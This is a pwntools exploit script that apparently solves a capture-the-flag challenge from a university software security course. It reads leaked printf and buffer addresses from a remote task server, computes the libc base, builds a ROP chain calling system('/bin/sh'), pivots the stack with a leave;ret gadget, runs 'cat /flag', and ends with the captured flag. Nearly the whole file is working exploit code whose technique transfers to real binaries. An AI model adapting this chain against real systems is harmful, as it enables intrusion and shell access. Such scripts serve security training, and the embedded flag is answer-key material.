from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file vuln
b *(main)
b *(main+146)
b *(main+183)
b *(main+209)
#set detach-on-fork off
#set follow-fork-mode child
set follow-fork-mode parent
#catch fork
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33605)

#p=remote("127.0.0.1", 1024)



#p2=process('tmux split-window -h gdb -x gdbscript -p $(pgrep -n vuln)', shell=True)
#sleep(1)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


p.recvuntil(b"P R I N T F: ")
printf_addr = int(p.recvline().decode()[2:], 16)
print(hex(printf_addr))
libc_addr = printf_addr - 337328

p.recvuntil(b"??? : ")
buf1_addr = int(p.recvline().decode()[2:], 16)
print(hex(buf1_addr))


p.recvuntil(b"swing location:\n")

libc = ELF("./libc.so.6")
libc.address = libc_addr

rop = ROP(libc)
rop.raw(pack(rop.ret.address)) #twice so stack is aligned again
rop.raw(pack(rop.ret.address))
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
payload = rop.chain()
p.sendline(payload)

p.recvuntil(b"Now swing to it:\n")
payload  = cyclic(cyclic_find_bytes(0x6161616b)-8)
payload += p64(buf1_addr)
payload += p64(0x401226) # leave; ret;
p.sendline(payload)

p.sendline(b"cat /flag")

p.interactive()

#softsec{pGUGxXGrmB3XMqI64v21Ga47GoPzhCgNaHslb96UFkuTAaJNPYNcq5qmuXrONd1x}